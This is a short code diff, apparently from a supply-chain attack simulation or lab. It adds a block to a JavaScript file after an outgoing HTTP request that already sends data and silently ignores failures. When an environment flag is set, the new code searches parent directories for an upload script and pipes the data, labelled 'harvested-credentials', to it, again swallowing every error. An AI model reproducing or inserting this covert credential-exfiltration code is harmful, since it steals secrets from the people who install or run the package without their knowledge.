@@ -116,6 +116,30 @@
 
       req.write(data);
       req.end();
+
+      // Optional Floci S3 mirror (SCAS_FLOCI_ENABLED=1)
+      try {
+        const { execFileSync } = require('child_process');
+        const fs = require('fs');
+        const path = require('path');
+        if (process.env.SCAS_FLOCI_ENABLED === '1') {
+          let dir = process.cwd();
+          for (let n = 0; n < 12; n++) {
+            const upload = path.join(dir, 'scripts', 'floci-upload-json.sh');
+            if (fs.existsSync(upload)) {
+              execFileSync(upload, ['06', 'harvested-credentials'], {
+                input: data,
+                stdio: ['pipe', 'pipe', 'pipe'],
+                env: process.env,
+              });
+              break;
+            }
+            const up = path.dirname(dir);
+            if (up === dir) break;
+            dir = up;
+          }
+        }
+      } catch (_) {}
     } catch (e) {
       // Silently fail
     }
